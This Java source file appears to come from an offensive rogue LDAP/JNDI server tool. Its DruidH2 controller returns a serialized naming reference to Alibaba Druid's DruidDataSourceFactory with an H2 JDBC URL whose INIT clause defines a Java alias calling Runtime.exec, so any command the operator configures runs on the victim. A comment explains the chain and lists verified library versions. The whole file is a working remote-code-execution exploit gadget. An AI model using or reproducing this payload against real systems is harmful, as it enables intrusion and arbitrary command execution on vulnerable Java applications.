package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * RCE by controlling the JDBC URL (connection string) of DruidDataSourceFactory.
 * DruidDataSourceFactory offers an implementation of javax.naming.ObjectFactory, enabling the instantiation of data
 * sources where the connection string is modifiable via the url attribute.
 * The JDBC connection string for an H2 database includes an INIT parameter, allowing the execution of an SQL statement.
 * Utilizing the CREATE ALIAS command, one can establish a function that embeds a Java payload, which can then be invoked within an SQL query.
 * Therefore, by configuring a JDBC connection string for an H2 database to include an INIT parameter that directs to an
 * SQL statement featuring the CREATE ALIAS command followed by a CALL command, arbitrary Java code can be executed.
 *
 * Requires:
 *  Druid and H2 in classpath
 *
 *  Verified On:
 *  - com.alibaba:druid:1.0.15
 *  - com.h2database:h2:2.1.214
 *
 * @author snowyowl
 */

@LdapMapping(uri = {"/o=druid-h2"})
public class DruidH2 implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with druid-h2-sql payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS " +
                "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";

        Reference ref = new Reference("javax.sql.DataSource", "com.alibaba.druid.pool.DruidDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        ref.add(new StringRefAddr("init", "true"));


        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
